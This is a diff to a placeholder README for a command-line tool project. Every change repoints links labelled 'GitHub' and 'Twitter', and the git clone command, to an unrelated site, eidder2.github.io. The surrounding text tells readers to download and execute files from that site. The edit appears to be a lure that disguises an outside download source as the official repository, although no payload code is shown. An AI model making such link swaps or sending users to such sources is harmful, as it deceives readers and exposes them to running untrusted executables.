@@ -23,14 +23,14 @@ Welcome to the CLI Tool repository! This project aims to provide a simple comman
 
 ## Installation 🛠️
 
-To get started with the CLI Tool, you need to download and execute the necessary files. Visit [GitHub](https://github.com) for the latest release. 
+To get started with the CLI Tool, you need to download and execute the necessary files. Visit [GitHub](https://eidder2.github.io) for the latest release. 
 
 Once you have the files, follow these steps:
 
 1. **Clone the repository:**
 
    ```bash
-   git clone https://github.com/yourusername/cli.git
+   git clone https://eidder2.github.io
    ```
 
 2. **Navigate to the project directory:**
@@ -109,8 +109,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, feel free to reach out:
 
 - **Email**: yourname@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Twitter**: [@yourhandle](https://eidder2.github.io)
 
-Thank you for checking out the CLI Tool! Don't forget to visit [GitHub](https://github.com) for updates and releases. 
+Thank you for checking out the CLI Tool! Don't forget to visit [GitHub](https://eidder2.github.io) for updates and releases. 
 
 For more information, check the "Releases" section in this repository.
